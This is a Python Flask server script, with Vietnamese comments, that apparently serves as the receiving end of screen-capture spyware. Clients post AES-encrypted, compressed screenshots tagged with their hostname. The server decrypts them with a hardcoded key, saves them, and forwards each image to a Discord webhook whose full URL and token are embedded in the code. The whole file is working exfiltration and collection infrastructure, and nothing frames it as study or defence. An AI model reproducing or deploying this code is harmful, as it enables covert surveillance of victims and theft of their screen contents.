from flask import Flask, request, jsonify
from Crypto.Cipher import AES
import base64, os
from datetime import datetime
import zlib
import requests

app = Flask(__name__)
SECRET_KEY = b'ThisIsASecretKey'
SAVE_FOLDER = "received"
os.makedirs(SAVE_FOLDER, exist_ok=True)

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1379493184245207120/lm4Yy1mUQyVAlILh2RCxhHKauYyEmgycIEseWXwMf7uT8KufpBG6AmSxzvq5en5evsS8"

def send_to_discord(filename, filepath):
    with open(filepath, "rb") as f:
        files = {"file": (filename, f)}
        payload = {"content": f"📸 Ảnh mới từ client `{filename}`"}
        try:
            response = requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
            if response.status_code == 204:
                print(f"[+] Đã gửi ảnh tới Discord.")
            else:
                print(f"[-] Lỗi gửi Discord: {response.status_code} - {response.text}")
        except Exception as e:
            print(f"[-] Gửi Discord thất bại: {e}")

def decrypt_aes(data, key):
    nonce = base64.b64decode(data['nonce'])
    tag = base64.b64decode(data['tag'])
    ciphertext = base64.b64decode(data['data'])
    cipher = AES.new(key, AES.MODE_EAX, nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)

@app.route("/")
def index():
    return "Server is running."

@app.route("/upload", methods=["POST"])
def upload():
    try:
        content = request.get_json()
        info = content["system_info"]
        img_data_encrypted = content["screenshot"]

        # Giải mã AES
        decrypted_data = decrypt_aes(img_data_encrypted, SECRET_KEY)

        # Giải nén zlib
        img_data = zlib.decompress(decrypted_data)

        # Tạo tên file và lưu
        filename = f"{info['hostname']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        path = os.path.join(SAVE_FOLDER, filename)
        with open(path, "wb") as f:
            f.write(img_data)

        # Gửi ảnh lên Discord
        send_to_discord(filename, path)

        return jsonify({"status": "ok"})
    except Exception as e:
        print(f"[-] Error: {e}")
        return jsonify({"status": "fail", "error": str(e)}), 400
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
